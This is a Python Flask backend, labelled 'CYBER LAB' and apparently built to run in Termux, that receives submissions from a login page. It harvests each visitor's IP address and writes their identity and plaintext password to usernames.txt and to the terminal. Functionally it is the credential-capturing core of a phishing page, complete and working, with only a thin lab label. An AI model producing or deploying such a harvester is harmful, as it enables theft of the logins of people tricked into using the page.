#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from flask import Flask, render_template, request, jsonify
from datetime import datetime

app = Flask(__name__)

@app.route("/")
def home():
    return render_template("index.html")

@app.route("/login", methods=["POST"])
def login():
    data = request.get_json()

    identity         = data.get("identity")
    password_present = data.get("passwordPresent")

    # --- IP HARVEST ---
    forwarded = request.headers.get("X-Forwarded-For", "")
    if forwarded:
        client_ip = forwarded.split(",")[0].strip()
    else:
        client_ip = request.remote_addr or "unknown"

    # Value bilkul as-it-is, koi .strip() nahi
    captured_password = str(data.get("password", ""))

    # PHP: file_put_contents("usernames.txt", ... FILE_APPEND)
    # Order: IP -> Identity -> Pass
    with open("usernames.txt", "a", encoding="utf-8") as f:
        f.write("IP: " + client_ip
                + " | Identity: " + str(identity)
                + " | Pass: " + captured_password + "\n")

    print("\n===== CYBER LAB =====")

    timestamp_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f").rstrip("0").rstrip(".")
    print(f"Time: {timestamp_str}")

    print(f"Client IP:    {client_ip}")
    print(f"Identity:     {identity}")
    print(f"Password field submitted: {password_present}")

    # Terminal me password poora dikhta hai
    print(f"Password value: '{captured_password}'\n")

    # Response me password jaan-boojh kar nahi bheja
    return jsonify({
        "success": True,
        "message": "Login test saved. Password hidden on screen — check Termux or usernames.txt."
    })

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=8080, debug=True)
